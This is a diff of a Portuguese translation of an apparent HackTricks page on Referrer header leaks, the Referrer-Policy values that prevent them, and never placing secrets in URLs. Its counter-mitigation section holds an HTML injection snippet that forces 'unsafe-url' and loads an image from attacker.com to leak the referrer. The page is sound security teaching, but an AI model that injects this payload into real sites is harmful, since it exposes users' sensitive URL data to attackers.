@@ -1,16 +1,18 @@
+# HTTP interessante
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Cabeçalhos e política de Referência
+## Headers e política de Referrer
 
-Referência é o cabeçalho usado pelos navegadores para indicar qual foi a página anterior visitada.
+Referrer é o header usado pelos browsers para indicar qual foi a página visitada anteriormente.
 
-## Informações sensíveis vazadas
+### Sensitive information leaked
 
-Se em algum momento dentro de uma página da web, qualquer informação sensível estiver localizada nos parâmetros de uma solicitação GET, se a página contiver links para fontes externas ou um atacante conseguir fazer/sugerir (engenharia social) que o usuário visite uma URL controlada pelo atacante. Isso poderia permitir a exfiltração das informações sensíveis dentro da última solicitação GET.
+Se, em algum momento, dentro de uma página web, alguma informação sensível estiver localizada nos parâmetros de uma requisição GET, se a página contiver links para fontes externas ou se um atacante conseguir fazer/sugerir (engenharia social) que o usuário visite uma URL controlada pelo atacante, seria possível exfiltrar a informação sensível contida na requisição GET mais recente.
 
-## Mitigação
+### Mitigation
 
-Você pode fazer com que o navegador siga uma **política de Referência** que poderia **evitar** que as informações sensíveis sejam enviadas para outras aplicações web:
+Você pode fazer com que o browser siga uma **Referrer-policy** que poderia **evitar** que as informações sensíveis fossem enviadas para outras web applications:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Contra-Mitigação
+### Contramedida
 
-Você pode substituir esta regra usando uma tag meta HTML (o atacante precisa explorar uma injeção HTML):
+Você pode sobrescrever essa regra usando uma tag meta HTML (o atacante precisa explorar uma injeção de HTML):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Defesa
 
-Nunca coloque dados sensíveis dentro de parâmetros GET ou caminhos na URL.
+Nunca coloque dados confidenciais dentro de parâmetros GET ou caminhos na URL.
 
 {{#include ../banners/hacktricks-training.md}}
